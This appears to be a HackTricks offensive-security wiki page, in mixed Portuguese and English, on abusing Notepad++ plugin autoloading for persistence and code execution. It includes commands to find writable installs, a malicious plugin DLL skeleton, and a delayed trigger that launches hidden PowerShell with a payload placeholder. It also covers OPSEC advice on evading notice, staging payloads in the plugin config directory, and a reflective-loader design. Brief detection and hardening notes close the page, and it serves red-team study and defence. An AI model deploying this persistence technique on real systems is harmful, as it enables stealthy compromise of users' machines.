# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

O Notepad++ vai **autoload every plugin DLL found under its `plugins` subfolders** ao iniciar. Dropar um plugin malicioso em qualquer **instalação gravável do Notepad++** dá code execution dentro de `notepad++.exe` toda vez que o editor inicia, o que pode ser abusado para **persistence**, **initial execution** furtiva, ou como um **in-process loader** se o editor for iniciado elevado.

Desde o **Notepad++ 7.6+** o layout esperado para instalação manual é **uma subpasta por plugin** (`plugins\<PluginName>\<PluginName>.dll`). Em **portable mode** (presença de `doLocalConf.xml` ao lado de `notepad++.exe`), toda a árvore da aplicação permanece local nesse diretório, o que muitas vezes transforma bundles de ferramentas copiados/admin em uma superfície de execução facilmente gravável pelo usuário.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (geralmente requer admin para escrever).
- Writable options for low-privileged operators:
- Use the **portable Notepad++ build** em uma pasta gravável pelo usuário.
- Copie `C:\Program Files\Notepad++` para um caminho controlado pelo usuário (por exemplo, `%LOCALAPPDATA%\npp\`) e execute `notepad++.exe` a partir daí.
- Procure por **admin tool bundles**, cópias extraídas de zip, ou toolkits de help-desk que já contenham `doLocalConf.xml` e vivam fora de `Program Files`.
- Each plugin gets its own subfolder under `plugins` and is loaded automatically at startup; menu entries appear under **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Pontos de carregamento do plugin (primitivos de execução)
Notepad++ espera funções **exportadas** específicas. Todas são chamadas durante a inicialização, dando múltiplas superfícies de execução:
- **`DllMain`** — executa imediatamente no carregamento da DLL (primeiro ponto de execução).
- **`setInfo(NppData)`** — chamado uma vez no load para fornecer os handles do Notepad++; local típico para registrar itens de menu.
- **`getName()`** — retorna o nome do plugin mostrado no menu.
- **`getFuncsArray(int *nbF)`** — retorna comandos de menu; mesmo vazio, é chamado durante a inicialização.
- **`beNotified(SCNotification*)`** — recebe eventos do Notepad++ / Scintilla (útil para adiar payloads até uma ação do usuário ou evento do editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — manipulador de mensagens, útil para trocas maiores de dados.
- **`isUnicode()`** — flag de compatibilidade verificada no load.

A maioria dos exports pode ser implementada como **stubs**; a execução pode ocorrer a partir de `DllMain` ou de qualquer callback acima durante o autoload.

## Esqueleto mínimo de plugin malicioso
Compile uma DLL com os exports esperados e coloque-a em `plugins\\MyNewPlugin\\MyNewPlugin.dll` dentro de uma pasta do Notepad++ gravável:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compile a DLL (Visual Studio/MinGW).
2. Crie a subpasta do plugin dentro de `plugins` e coloque a DLL lá.
3. Reinicie o Notepad++; a DLL é carregada automaticamente, executando `DllMain` e os callbacks subsequentes.

## Padrão de disparo de baixo ruído via `beNotified`
Para OPSEC, muitos payloads não devem ser executados a partir de `DllMain`. Um padrão mais discreto é deixar o plugin carregar normalmente e então executar apenas após um evento realista do editor, como **startup complete**, **buffer activation** ou o **primeiro caractere digitado**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Isto se alinha melhor com pesquisas ofensivas públicas do que um beacon `DllMain` ruidoso: a DLL ainda é carregada automaticamente na inicialização, mas a ação maliciosa é atrasada até que o Notepad++ pareça estar realmente em uso.

## Usando o diretório de configuração do plugin como armazenamento secundário
O Notepad++ expõe `NPPM_GETPLUGINSCONFIGDIR`, que retorna o **diretório de configuração de plugins do usuário atual**. Um plugin malicioso pode usar isso para manter a DLL em disco minimalista enquanto armazena configuração criptografada, payloads staged ou arquivos de tasking em um caminho que se mistura ao estado normal dos plugins.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally this is useful when you want:
- um pequeno bootstrap DLL autoloaded;
- tasking por usuário sem tocar novamente no binary principal do plugin;
- separar o **autoload trigger** da segunda stage mais pesada.

## Reflective loader plugin pattern
Um plugin weaponized pode transformar o Notepad++ em um **reflective DLL loader**:
- Apresentar uma interface/menu entry mínima (por exemplo, "LoadDLL").
- Aceitar um **file path** ou **URL** para buscar um payload DLL.
- Mapear reflexivamente o DLL no processo atual e invocar um exported entry point (por exemplo, uma função loader dentro do DLL obtido).
- Benefício: reutilizar um processo GUI aparentemente benigno em vez de iniciar um novo loader; o payload herda a integridade de `notepad++.exe` (incluindo contexts elevados).
- Trade-offs: soltar um **unsigned plugin DLL** no disco é ruidoso; uma variação prática é usar o plugin autoloaded apenas como um stub e manter o implant real encrypted/staged em outro lugar.

## Detection and hardening notes
- Bloquear ou monitorar **writes to Notepad++ plugin directories** (incluindo cópias portable em perfis de usuário); habilitar controlled folder access ou application allowlisting.
- Gerar alerta em **new unsigned DLLs** em `plugins`, mudanças em árvores portable do Notepad++ e **child processes/network activity** incomuns de `notepad++.exe`.
- Estabelecer baseline de plugins legítimos e investigar qualquer novo DLL que exporte a interface normal de plugin do Notepad++ mas também invoque shells, PowerShell ou network beacons.
- Impor a instalação de plugins somente via **Plugins Admin**, e restringir a execução de cópias portable a partir de paths não confiáveis.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
